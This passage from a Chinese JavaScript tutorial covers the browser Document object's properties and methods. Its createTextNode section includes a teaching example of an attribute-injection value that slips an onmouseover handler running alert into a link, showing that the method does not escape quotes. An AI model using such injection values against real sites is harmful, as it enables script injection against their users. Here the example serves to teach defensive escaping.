true</code></pre><p>如果文档的锚点（<code>#anchor</code>）变化，这两个属性都会跟着变化。</p>\n<p><strong>（2）document.domain</strong></p>\n<p><code>document.domain</code>属性返回当前文档的域名，不包含协议和接口。比如，网页的网址是<code>http://www.example.com:80/hello.html</code>，那么<code>domain</code>属性就等于<code>www.example.com</code>。如果无法获取域名，该属性返回<code>null</code>。</p>\n<p><code>document.domain</code>基本上是一个只读属性，只有一种情况除外。次级域名的网页，可以把<code>document.domain</code>设为对应的上级域名。比如，当前域名是<code>a.sub.example.com</code>，则<code>document.domain</code>属性可以设置为<code>sub.example.com</code>，也可以设为<code>example.com</code>。修改后，<code>document.domain</code>相同的两个网页，可以读取对方的资源，比如设置的 Cookie。</p>\n<p>另外，设置<code>document.domain</code>会导致端口被改成<code>null</code>。因此，如果通过设置<code>document.domain</code>来进行通信，双方网页都必须设置这个值，才能保证端口相同。</p>\n<p><strong>（3）document.location</strong></p>\n<p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>\n<p>关于这个对象的详细介绍，请看《浏览器模型》部分的《Location 对象》章节。</p>\n<p><strong>（4）document.lastModified</strong></p>\n<p><code>document.lastModified</code>属性返回一个字符串，表示当前文档最后修改的时间。不同浏览器的返回值，日期格式是不一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.lastModified\n// &quot;03/07/2018 11:18:27&quot;</code></pre><p>注意，<code>document.lastModified</code>属性的值是字符串，所以不能直接用来比较。<code>Date.parse</code>方法将其转为<code>Date</code>实例，才能比较两个网页。</p>\n<pre class=\"prettyprint language-javascript\"><code>var lastVisitedDate = Date.parse(&#039;01/01/2018&#039;);\nif (Date.parse(document.lastModified) &gt; lastVisitedDate) {\n  console.log(&#039;网页已经变更&#039;);\n}</code></pre><p>如果页面上有 JavaScript 生成的内容，<code>document.lastModified</code>属性返回的总是当前时间。</p>\n<p><strong>（5）document.title</strong></p>\n<p><code>document.title</code>属性返回当前文档的标题。默认情况下，返回<code>&lt;title&gt;</code>节点的值。但是该属性是可写的，一旦被修改，就返回修改后的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.title = &#039;新标题&#039;;\ndocument.title // &quot;新标题&quot;</code></pre><p><strong>（6）document.characterSet</strong></p>\n<p><code>document.characterSet</code>属性返回当前文档的编码，比如<code>UTF-8</code>、<code>ISO-8859-1</code>等等。</p>\n<p><strong>（7）document.referrer</strong></p>\n<p><code>document.referrer</code>属性返回一个字符串，表示当前文档的访问者来自哪里。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.referrer\n// &quot;https://example.com/path&quot;</code></pre><p>如果无法获取来源，或者用户直接键入网址而不是从其他网页点击进入，<code>document.referrer</code>返回一个空字符串。</p>\n<p><code>document.referrer</code>的值，总是与 HTTP 头信息的<code>Referer</code>字段保持一致。但是，<code>document.referrer</code>的拼写有两个<code>r</code>，而头信息的<code>Referer</code>字段只有一个<code>r</code>。</p>\n<p><strong>（8）document.dir</strong></p>\n<p><code>document.dir</code>返回一个字符串，表示文字方向。它只有两个可能的值：<code>rtl</code>表示文字从右到左，阿拉伯文是这种方式；<code>ltr</code>表示文字从左到右，包括英语和汉语在内的大多数文字采用这种方式。</p>\n<p><strong>（9）document.compatMode</strong></p>\n<p><code>compatMode</code>属性返回浏览器处理文档的模式，可能的值为<code>BackCompat</code>（向后兼容模式）和<code>CSS1Compat</code>（严格模式）。</p>\n<p>一般来说，如果网页代码的第一行设置了明确的<code>DOCTYPE</code>（比如<code>&lt;!doctype html&gt;</code>），<code>document.compatMode</code>的值都为<code>CSS1Compat</code>。</p>\n\n        <h3>\n            <a href='#文档状态属性' class='header-anchor'>#</a>\n            <span>文档状态属性</span>\n        </h3>\n    <p><strong>（1）document.hidden</strong></p>\n<p><code>document.hidden</code>属性返回一个布尔值，表示当前页面是否可见。如果窗口最小化、浏览器切换了 Tab，都会导致导致页面不可见，使得<code>document.hidden</code>返回<code>true</code>。</p>\n<p>这个属性是 Page Visibility API 引入的，一般都是配合这个 API 使用。</p>\n<p><strong>（2）document.visibilityState</strong></p>\n<p><code>document.visibilityState</code>返回文档的可见状态。</p>\n<p>它的值有四种可能。</p>\n<ul>\n<li>visible：页面可见。注意，页面可能是部分可见，即不是焦点窗口，前面被其他窗口部分挡住了。</li>\n<li>hidden： 页面不可见，有可能窗口最小化，或者浏览器切换到了另一个 Tab。</li>\n<li>prerender：页面处于正在渲染状态，对于用于来说，该页面不可见。</li>\n<li>unloaded：页面从内存里面卸载了。</li>\n</ul>\n<p>这个属性可以用在页面加载时，防止加载某些资源；或者页面不可见时，停掉一些页面功能。</p>\n<p><strong>（3）document.readyState</strong></p>\n<p><code>document.readyState</code>属性返回当前文档的状态，共有三种可能的值。</p>\n<ul>\n<li><code>loading</code>：加载 HTML 代码阶段（尚未完成解析）</li>\n<li><code>interactive</code>：加载外部资源阶段</li>\n<li><code>complete</code>：加载完成</li>\n</ul>\n<p>这个属性变化的过程如下。</p>\n<ol>\n<li>浏览器开始解析 HTML 文档，<code>document.readyState</code>属性等于<code>loading</code>。</li>\n<li>浏览器遇到 HTML 文档中的<code>&lt;script&gt;</code>元素，并且没有<code>async</code>或<code>defer</code>属性，就暂停解析，开始执行脚本，这时<code>document.readyState</code>属性还是等于<code>loading</code>。</li>\n<li>HTML 文档解析完成，<code>document.readyState</code>属性变成<code>interactive</code>。</li>\n<li>浏览器等待图片、样式表、字体文件等外部资源加载完成，一旦全部加载完成，<code>document.readyState</code>属性变成<code>complete</code>。</li>\n</ol>\n<p>下面的代码用来检查网页是否加载成功。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 基本检查\nif (document.readyState === &#039;complete&#039;) {\n  // ...\n}\n\n// 轮询检查\nvar interval = setInterval(function() {\n  if (document.readyState === &#039;complete&#039;) {\n    clearInterval(interval);\n    // ...\n  }\n}, 100);</code></pre><p>另外，每次状态变化都会触发一个<code>readystatechange</code>事件。</p>\n\n        <h3>\n            <a href='#document.cookie' class='header-anchor'>#</a>\n            <span>document.cookie</span>\n        </h3>\n    <p><code>document.cookie</code>属性用来操作浏览器 Cookie，详见《浏览器模型》部分的《Cookie》章节。</p>\n\n        <h3>\n            <a href='#document.designMode' class='header-anchor'>#</a>\n            <span>document.designMode</span>\n        </h3>\n    <p><code>document.designMode</code>属性控制当前文档是否可编辑。该属性只有两个值<code>on</code>和<code>off</code>，默认值为<code>off</code>。一旦设为<code>on</code>，用户就可以编辑整个文档的内容。</p>\n<p>下面代码打开<code>iframe</code>元素内部文档的<code>designMode</code>属性，就能将其变为一个所见即所得的编辑器。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;iframe id=&quot;editor&quot; src=&quot;about:blank&quot;&gt;&lt;/iframe&gt;\nvar editor = document.getElementById(&#039;editor&#039;);\neditor.contentDocument.designMode = &#039;on&#039;;</code></pre>\n        <h3>\n            <a href='#document.implementation' class='header-anchor'>#</a>\n            <span>document.implementation</span>\n        </h3>\n    <p><code>document.implementation</code>属性返回一个<code>DOMImplementation</code>对象。该对象有三个方法，主要用于创建独立于当前文档的新的 Document 对象。</p>\n<ul>\n<li><code>DOMImplementation.createDocument()</code>：创建一个 XML 文档。</li>\n<li><code>DOMImplementation.createHTMLDocument()</code>：创建一个 HTML 文档。</li>\n<li><code>DOMImplementation.createDocumentType()</code>：创建一个 DocumentType 对象。</li>\n</ul>\n<p>下面是创建 HTML 文档的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var doc = document.implementation.createHTMLDocument(&#039;Title&#039;);\nvar p = doc.createElement(&#039;p&#039;);\np.innerHTML = &#039;hello world&#039;;\ndoc.body.appendChild(p);\n\ndocument.replaceChild(\n  doc.documentElement,\n  document.documentElement\n);</code></pre><p>上面代码中，第一步生成一个新的 HTML 文档<code>doc</code>，然后用它的根元素<code>document.documentElement</code>替换掉<code>document.documentElement</code>。这会使得当前文档的内容全部消失，变成<code>hello world</code>。</p>\n\n        <h2>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#document.open()，document.close()' class='header-anchor'>#</a>\n            <span>document.open()，document.close()</span>\n        </h3>\n    <p><code>document.open</code>方法清除当前文档所有内容，使得文档处于可写状态，供<code>document.write</code>方法写入内容。</p>\n<p><code>document.close</code>方法用来关闭<code>document.open()</code>打开的文档。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.open();\ndocument.write(&#039;hello world&#039;);\ndocument.close();</code></pre>\n        <h3>\n            <a href='#document.write()，document.writeln()' class='header-anchor'>#</a>\n            <span>document.write()，document.writeln()</span>\n        </h3>\n    <p><code>document.write</code>方法用于向当前文档写入内容。</p>\n<p>在网页的首次渲染阶段，只要页面没有关闭写入（即没有执行<code>document.close()</code>），<code>document.write</code>写入的内容就会追加在已有内容的后面。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 页面显示“helloworld”\ndocument.open();\ndocument.write(&#039;hello&#039;);\ndocument.write(&#039;world&#039;);\ndocument.close();</code></pre><p>注意，<code>document.write</code>会当作 HTML 代码解析，不会转义。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.write(&#039;&lt;p&gt;hello world&lt;/p&gt;&#039;);</code></pre><p>上面代码中，<code>document.write</code>会将<code>&lt;p&gt;</code>当作 HTML 标签解释。</p>\n<p>如果页面已经解析完成（<code>DOMContentLoaded</code>事件发生之后），再调用<code>write</code>方法，它会先调用<code>open</code>方法，擦除当前文档所有内容，然后再写入。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.addEventListener(&#039;DOMContentLoaded&#039;, function (event) {\n  document.write(&#039;&lt;p&gt;Hello World!&lt;/p&gt;&#039;);\n});\n\n// 等同于\ndocument.addEventListener(&#039;DOMContentLoaded&#039;, function (event) {\n  document.open();\n  document.write(&#039;&lt;p&gt;Hello World!&lt;/p&gt;&#039;);\n  document.close();\n});</code></pre><p>如果在页面渲染过程中调用<code>write</code>方法，并不会自动调用<code>open</code>方法。（可以理解成，<code>open</code>方法已调用，但<code>close</code>方法还未调用。）</p>\n<pre class=\"prettyprint language-html\"><code>&lt;html&gt;\n&lt;body&gt;\nhello\n&lt;script type=&quot;text/javascript&quot;&gt;\n  document.write(&quot;world&quot;)\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;</code></pre><p>在浏览器打开上面网页，将会显示<code>hello world</code>。</p>\n<p><code>document.write</code>是JavaScript语言标准化之前就存在的方法，现在完全有更符合标准的方法向文档写入内容（比如对<code>innerHTML</code>属性赋值）。所以，除了某些特殊情况，应该尽量避免使用<code>document.write</code>这个方法。</p>\n<p><code>document.writeln</code>方法与<code>write</code>方法完全一致，除了会在输出内容的尾部添加换行符。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.write(1);\ndocument.write(2);\n// 12\n\ndocument.writeln(1);\ndocument.writeln(2);\n// 1\n// 2\n//</code></pre><p>注意，<code>writeln</code>方法添加的是 ASCII 码的换行符，渲染成 HTML 网页时不起作用，即在网页上显示不出换行。网页上的换行，必须显式写入<code>&lt;br&gt;</code>。</p>\n\n        <h3>\n            <a href='#document.querySelector()，document.querySelectorAll()' class='header-anchor'>#</a>\n            <span>document.querySelector()，document.querySelectorAll()</span>\n        </h3>\n    <p><code>document.querySelector</code>方法接受一个 CSS 选择器作为参数，返回匹配该选择器的元素节点。如果有多个节点满足匹配条件，则返回第一个匹配的节点。如果没有发现匹配的节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el1 = document.querySelector(&#039;.myclass&#039;);\nvar el2 = document.querySelector(&#039;#myParent &gt; [ng-click]&#039;);</code></pre><p><code>document.querySelectorAll</code>方法与<code>querySelector</code>用法类似，区别是返回一个<code>NodeList</code>对象，包含所有匹配给定选择器的节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>elementList = document.querySelectorAll(&#039;.myclass&#039;);</code></pre><p>这两个方法的参数，可以是逗号分隔的多个 CSS 选择器，返回匹配其中一个选择器的元素节点，这与 CSS 选择器的规则是一致的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var matches = document.querySelectorAll(&#039;div.note, div.alert&#039;);</code></pre><p>上面代码返回<code>class</code>属性是<code>note</code>或<code>alert</code>的<code>div</code>元素。</p>\n<p>这两个方法都支持复杂的 CSS 选择器。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 选中 data-foo-bar 属性等于 someval 的元素\ndocument.querySelectorAll(&#039;[data-foo-bar=&quot;someval&quot;]&#039;);\n\n// 选中 myForm 表单中所有不通过验证的元素\ndocument.querySelectorAll(&#039;#myForm :invalid&#039;);\n\n// 选中div元素，那些 class 含 ignore 的除外\ndocument.querySelectorAll(&#039;DIV:not(.ignore)&#039;);\n\n// 同时选中 div，a，script 三类元素\ndocument.querySelectorAll(&#039;DIV, A, SCRIPT&#039;);</code></pre><p>但是，它们不支持 CSS 伪元素的选择器（比如<code>:first-line</code>和<code>:first-letter</code>）和伪类的选择器（比如<code>:link</code>和<code>:visited</code>），即无法选中伪元素和伪类。</p>\n<p>如果<code>querySelectorAll</code>方法的参数是字符串<code>*</code>，则会返回文档中的所有元素节点。另外，<code>querySelectorAll</code>的返回结果不是动态集合，不会实时反映元素节点的变化。</p>\n<p>最后，这两个方法除了定义在<code>document</code>对象上，还定义在元素节点上，即在元素节点上也可以调用。</p>\n\n        <h3>\n            <a href='#document.getElementsByTagName()' class='header-anchor'>#</a>\n            <span>document.getElementsByTagName()</span>\n        </h3>\n    <p><code>document.getElementsByTagName</code>方法搜索 HTML 标签名，返回符合条件的元素。它的返回值是一个类似数组对象（<code>HTMLCollection</code>实例），可以实时反映 HTML 文档的变化。如果没有任何匹配的元素，就返回一个空集。</p>\n<pre class=\"prettyprint language-javascript\"><code>var paras = document.getElementsByTagName(&#039;p&#039;);\nparas instanceof HTMLCollection // true</code></pre><p>上面代码返回当前文档的所有<code>p</code>元素节点。</p>\n<p>HTML 标签名是大小写不敏感的，因此<code>getElementsByTagName</code>方法也是大小写不敏感的。另外，返回结果中，各个成员的顺序就是它们在文档中出现的顺序。</p>\n<p>如果传入<code>*</code>，就可以返回文档中所有 HTML 元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var allElements = document.getElementsByTagName(&#039;*&#039;);</code></pre><p>注意，元素节点本身也定义了<code>getElementsByTagName</code>方法，返回该元素的后代元素中符合条件的元素。也就是说，这个方法不仅可以在<code>document</code>对象上调用，也可以在任何元素节点上调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var firstPara = document.getElementsByTagName(&#039;p&#039;)[0];\nvar spans = firstPara.getElementsByTagName(&#039;span&#039;);</code></pre><p>上面代码选中第一个<code>p</code>元素内部的所有<code>span</code>元素。</p>\n\n        <h3>\n            <a href='#document.getElementsByClassName()' class='header-anchor'>#</a>\n            <span>document.getElementsByClassName()</span>\n        </h3>\n    <p><code>document.getElementsByClassName</code>方法返回一个类似数组的对象（<code>HTMLCollection</code>实例），包括了所有<code>class</code>名字符合指定条件的元素，元素的变化实时反映在返回结果中。</p>\n<pre class=\"prettyprint language-javascript\"><code>var elements = document.getElementsByClassName(names);</code></pre><p>由于<code>class</code>是保留字，所以 JavaScript 一律使用<code>className</code>表示 CSS 的<code>class</code>。</p>\n<p>参数可以是多个<code>class</code>，它们之间使用空格分隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var elements = document.getElementsByClassName(&#039;foo bar&#039;);</code></pre><p>上面代码返回同时具有<code>foo</code>和<code>bar</code>两个<code>class</code>的元素，<code>foo</code>和<code>bar</code>的顺序不重要。</p>\n<p>注意，正常模式下，CSS 的<code>class</code>是大小写敏感的。（<code>quirks mode</code>下，大小写不敏感。）</p>\n<p>与<code>getElementsByTagName</code>方法一样，<code>getElementsByClassName</code>方法不仅可以在<code>document</code>对象上调用，也可以在任何元素节点上调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 非document对象上调用\nvar elements = rootElement.getElementsByClassName(names);</code></pre>\n        <h3>\n            <a href='#document.getElementsByName()' class='header-anchor'>#</a>\n            <span>document.getElementsByName()</span>\n        </h3>\n    <p><code>document.getElementsByName</code>方法用于选择拥有<code>name</code>属性的 HTML 元素（比如<code>&lt;form&gt;</code>、<code>&lt;radio&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;frame&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;object&gt;</code>等），返回一个类似数组的的对象（<code>NodeList</code>实例），因为<code>name</code>属性相同的元素可能不止一个。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 表单为 &lt;form name=&quot;x&quot;&gt;&lt;/form&gt;\nvar forms = document.getElementsByName(&#039;x&#039;);\nforms[0].tagName // &quot;FORM&quot;</code></pre>\n        <h3>\n            <a href='#document.getElementById()' class='header-anchor'>#</a>\n            <span>document.getElementById()</span>\n        </h3>\n    <p><code>document.getElementById</code>方法返回匹配指定<code>id</code>属性的元素节点。如果没有发现匹配的节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var elem = document.getElementById(&#039;para1&#039;);</code></pre><p>注意，该方法的参数是大小写敏感的。比如，如果某个节点的<code>id</code>属性是<code>main</code>，那么<code>document.getElementById(&#39;Main&#39;)</code>将返回<code>null</code>。</p>\n<p><code>document.getElementById</code>方法与<code>document.querySelector</code>方法都能获取元素节点，不同之处是<code>document.querySelector</code>方法的参数使用 CSS 选择器语法，<code>document.getElementById</code>方法的参数是元素的<code>id</code>属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&#039;myElement&#039;)\ndocument.querySelector(&#039;#myElement&#039;)</code></pre><p>上面代码中，两个方法都能选中<code>id</code>为<code>myElement</code>的元素，但是<code>document.getElementById()</code>比<code>document.querySelector()</code>效率高得多。</p>\n<p>另外，这个方法只能在<code>document</code>对象上使用，不能在其他元素节点上使用。</p>\n\n        <h3>\n            <a href='#document.elementFromPoint()，document.elementsFromPoint()' class='header-anchor'>#</a>\n            <span>document.elementFromPoint()，document.elementsFromPoint()</span>\n        </h3>\n    <p><code>document.elementFromPoint</code>方法返回位于页面指定位置最上层的元素节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var element = document.elementFromPoint(50, 50);</code></pre><p>上面代码选中在<code>(50, 50)</code>这个坐标位置的最上层的那个 HTML 元素。</p>\n<p><code>elementFromPoint</code>方法的两个参数，依次是相对于当前视口左上角的横坐标和纵坐标，单位是像素。如果位于该位置的 HTML 元素不可返回（比如文本框的滚动条），则返回它的父元素（比如文本框）。如果坐标值无意义（比如负值或超过视口大小），则返回<code>null</code>。</p>\n<p><code>document.elementsFromPoint()</code>返回一个数组，成员是位于指定坐标（相对于视口）的所有元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var elements = document.elementsFromPoint(x, y);</code></pre>\n        <h3>\n            <a href='#document.caretPositionFromPoint()' class='header-anchor'>#</a>\n            <span>document.caretPositionFromPoint()</span>\n        </h3>\n    <p><code>document.caretPositionFromPoint()</code>返回一个 CaretPosition 对象，包含了指定坐标点在节点对象内部的位置信息。CaretPosition 对象就是光标插入点的概念，用于确定光标点在文本对象内部的具体位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var range = document.caretPositionFromPoint(clientX, clientY);</code></pre><p>上面代码中，<code>range</code>是指定坐标点的 CaretPosition 对象。该对象有两个属性。</p>\n<ul>\n<li>CaretPosition.offsetNode：该位置的节点对象</li>\n<li>CaretPosition.offset：该位置在<code>offsetNode</code>对象内部，与起始位置相距的字符数。</li>\n</ul>\n\n        <h3>\n            <a href='#document.createElement()' class='header-anchor'>#</a>\n            <span>document.createElement()</span>\n        </h3>\n    <p><code>document.createElement</code>方法用来生成元素节点，并返回该节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var newDiv = document.createElement(&#039;div&#039;);</code></pre><p><code>createElement</code>方法的参数为元素的标签名，即元素节点的<code>tagName</code>属性，对于 HTML 网页大小写不敏感，即参数为<code>div</code>或<code>DIV</code>返回的是同一种节点。如果参数里面包含尖括号（即<code>&lt;</code>和<code>&gt;</code>）会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.createElement(&#039;&lt;div&gt;&#039;);\n// DOMException: The tag name provided (&#039;&lt;div&gt;&#039;) is not a valid name</code></pre><p>注意，<code>document.createElement</code>的参数可以是自定义的标签名。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.createElement(&#039;foo&#039;);</code></pre>\n        <h3>\n            <a href='#document.createTextNode()' class='header-anchor'>#</a>\n            <span>document.createTextNode()</span>\n        </h3>\n    <p><code>document.createTextNode</code>方法用来生成文本节点（<code>Text</code>实例），并返回该节点。它的参数是文本节点的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>var newDiv = document.createElement(&#039;div&#039;);\nvar newContent = document.createTextNode(&#039;Hello&#039;);\nnewDiv.appendChild(newContent);</code></pre><p>上面代码新建一个<code>div</code>节点和一个文本节点，然后将文本节点插入<code>div</code>节点。</p>\n<p>这个方法可以确保返回的节点，被浏览器当作文本渲染，而不是当作 HTML 代码渲染。因此，可以用来展示用户的输入，避免 XSS 攻击。</p>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.createElement(&#039;div&#039;);\ndiv.appendChild(document.createTextNode(&#039;&lt;span&gt;Foo &amp; bar&lt;/span&gt;&#039;));\nconsole.log(div.innerHTML)\n// &amp;lt;span&amp;gt;Foo &amp;amp; bar&amp;lt;/span&amp;gt;</code></pre><p>上面代码中，<code>createTextNode</code>方法对大于号和小于号进行转义，从而保证即使用户输入的内容包含恶意代码，也能正确显示。</p>\n<p>需要注意的是，该方法不对单引号和双引号转义，所以不能用来对 HTML 属性赋值。</p>\n<pre class=\"prettyprint language-html\"><code>function escapeHtml(str) {\n  var div = document.createElement(&#039;div&#039;);\n  div.appendChild(document.createTextNode(str));\n  return div.innerHTML;\n};\n\nvar userWebsite = &#039;&quot; onmouseover=&quot;alert(\\&#039;derp\\&#039;)&quot; &quot;&#039;;\nvar profileLink = &#039;&lt;a href=&quot;&#039; + escapeHtml(userWebsite) + &#039;&quot;&gt;Bob&lt;/a&gt;&#039;;\nvar div = document.getElementById(&#039;target&#039;);\ndiv.innerHTML = profileLink;\n// &lt;a href=&quot;&quot; onmouseover=&quot;alert(&#039;derp&#039;)&quot; &quot;&quot;&gt;Bob&lt;/a&gt;</code></pre><p>上面代码中，由于<code>createTextNode</code>方法不转义双引号，导致<code>onmouseover</code>方法被注入了代码。</p>\n\n        <h3>\n            <a href='#document.createAttribute()' class='header-anchor'>#</a>\n            <span>document.createAttribute()</span>\n        </h3>\n    <p><code>document.createAttribute</code>方法生成一个新的属性节点（<code>Attr</code>实例），并返回它。</p>\n<pre class=\"prettyprint language-javascript\"><code>var attribute = document.createAttribute(name);</code></pre><p><code>document.createAttribute</code>方法的参数<code>name</code>，是属性的名称。</p>\n<pre class=\"prettyprint language-javascript\"><code>var node = document.getElementById(&#039;div1&#039;);\n\nvar a = document.createAttribute(&#039;my_attrib&#039;);\na.value = &#039;newVal&#039;;\n\nnode.setAttributeNode(a);\n// 或者\nnode.setAttribute(&#039;my_attrib&#039;, &#039;newVal&#039;);</code></pre><p>上面代码为<code>div1</code>节点，插入一个值为<code>newVal</code>的<code>my_attrib</code>属性。</p>\n\n        <h3>\n            <a href='#document.createComment()' class='header-anchor'>#</a>\n            <span>document.createComment()</span>\n        </h3>\n    <p><code>document.createComment</code>方法生成一个新的注释节点，并返回该节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var CommentNode = document.createComment(data);</code></pre><p><code>document.createComment</code>方法的参数是一个字符串，会成为注释节点的内容。</p>\n\n        <h3>\n            <a href='#document.createDocumentFragment()' class='header-anchor'>#</a>\n            <span>document.createDocumentFragment()</span>\n        </h3>\n    <p><code>document.createDocumentFragment</code>方法生成一个空的文档片段对象（<code>DocumentFragment</code>实例）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var docFragment = document.createDocumentFragment();</code></pre><p><code>DocumentFragment</code>是一个存在于内存的 DOM 片段，不属于当前文档，常常用来生成一段较复杂的 DOM 结构，然后再插入当前文档。这样做的好处在于，因为<code>DocumentFragment</code>不属于当前文档，对它的任何改动，都不会引发网页的重新渲染，比直接修改当前文档的 DOM 有更好的性能表现。</p>\n<pre class=\"prettyprint language-javascript\"><code>var docfrag = document.createDocumentFragment();\n\n[1, 2, 3, 4].forEach(function (e) {\n  var li = document.createElement(&#039;li&#039;);\n  li.textContent = e;\n  docfrag.appendChild(li);\n});\n\nvar element  = document.getElementById(&#039;ul&#039;);\nelement.appendChild(docfrag);</code></pre><p>上面代码中，文档片断<code>docfrag</code>包含四个<code>&lt;li&gt;</code>节点，这些子节点被一次性插入了当前文档。</p>\n\n        <h3>\n            <a href='#document.createEvent()' class='header-anchor'>#</a>\n            <span>document.createEvent()</span>\n        </h3>\n    <p><code>document.createEvent</code>方法生成一个事件对象（<code>Event</code>实例），该对象可以被<code>element.dispatchEvent</code>方法使用，触发指定事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>var event = document.createEvent(type);</code></pre><p><code>document.createEvent</code>方法的参数是事件类型，比如<code>UIEvents</code>、<code>MouseEvents</code>、<code>MutationEvents</code>、<code>HTMLEvents</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var event = document.createEvent(&#039;Event&#039;);\nevent.initEvent(&#039;build&#039;, true, true);\ndocument.addEventListener(&#039;build&#039;, function (e) {\n  console.log(e.type); // &quot;build&quot;\n}, false);\ndocument.dispatchEvent(event);</code></pre><p>上面代码新建了一个名为<code>build</code>的事件实例，然后触发该事件。</p>\n\n        <h3>\n            <a href='#document.addEventListener()，document.removeEventListener()，document.dispatchEvent()' class='header-anchor'>#</a>\n            <span>document.addEventListener()，document.removeEventListener()，document.dispatchEvent()</span>\n        </h3>\n    <p>这三个方法用于处理<code>document</code>节点的事件。它们都继承自<code>EventTarget</code>接口，详细介绍参见《EventTarget 接口》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 添加事件监听函数\ndocument.addEventListener(&#039;click&#039;, listener, false);\n\n// 移除事件监听函数\ndocument.removeEventListener(&#039;click&#039;, listener, false);\n\n// 触发事件\nvar event = new Event(&#039;click&#039;);\ndocument.dispatchEvent(event);</code></pre>\n        <h3>\n            <a href='#document.hasFocus()' class='header-anchor'>#</a>\n            <span>document.hasFocus()</span>\n        </h3>\n    <p><code>document.hasFocus</code>方法返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var focused = document.hasFocus();</code></pre><p>注意，有焦点的文档必定被激活（active），反之不成立，激活的文档未必有焦点。比如，用户点击按钮，从当前窗口跳出一个新窗口，该新窗口就是激活的，但是不拥有焦点。</p>\n\n        <h3>\n            <a href='#document.adoptNode()，document.importNode()' class='header-anchor'>#</a>\n            <span>document.adoptNode()，document.importNode()</span>\n        </h3>\n    <p><code>document.adoptNode</code>方法将某个节点及其子节点，从原来所在的文档或<code>DocumentFragment</code>里面移除，归属当前<code>document</code>对象，返回插入后的新节点。插入的节点对象的<code>ownerDocument</code>属性，会变成当前的<code>document</code>对象，而<code>parentNode</code>属性是<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var node = document.adoptNode(externalNode);\ndocument.appendChild(node);</code></pre><p>注意，<code>document.adoptNode</code>方法只是改变了节点的归属，并没有将这个节点插入新的文档树。所以，还要再用<code>appendChild</code>方法或<code>insertBefore</code>方法，将新节点插入当前文档树。</p>\n<p><code>document.importNode</code>方法则是从原来所在的文档或<code>DocumentFragment</code>里面，拷贝某个节点及其子节点，让它们归属当前<code>document</code>对象。拷贝的节点对象的<code>ownerDocument</code>属性，会变成当前的<code>document</code>对象，而<code>parentNode</code>属性是<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var node = document.importNode(externalNode, deep);</code></pre><p><code>document.importNode</code>方法的第一个参数是外部节点，第二个参数是一个布尔值，表示对外部节点是深拷贝还是浅拷贝，默认是浅拷贝（false）。虽然第二个参数是可选的，但是建议总是保留这个参数，并设为<code>true</code>。</p>\n<p>注意，<code>document.importNode</code>方法只是拷贝外部节点，这时该节点的父节点是<code>null</code>。下一步还必须将这个节点插入当前文档树。</p>\n<pre class=\"prettyprint language-javascript\"><code>var iframe = document.getElementsByTagName(&#039;iframe&#039;)[0];\nvar oldNode = iframe.contentWindow.document.getElementById(&#039;myNode&#039;);\nvar newNode = document.importNode(oldNode, true);\ndocument.getElementById(&quot;container&quot;).appendChild(newNode);</code></pre><p>上面代码从<code>iframe</code>窗口，拷贝一个指定节点<code>myNode</code>，插入当前文档。</p>\n\n        <h3>\n            <a href='#document.createNodeIterator()' class='header-anchor'>#</a>\n            <span>document.createNodeIterator()</span>\n        </h3>\n    <p><code>document.createNodeIterator</code>方法返回一个子节点遍历器。</p>\n<pre class=\"prettyprint language-javascript\"><code>var nodeIterator = document.createNodeIterator(\n  document.body,\n  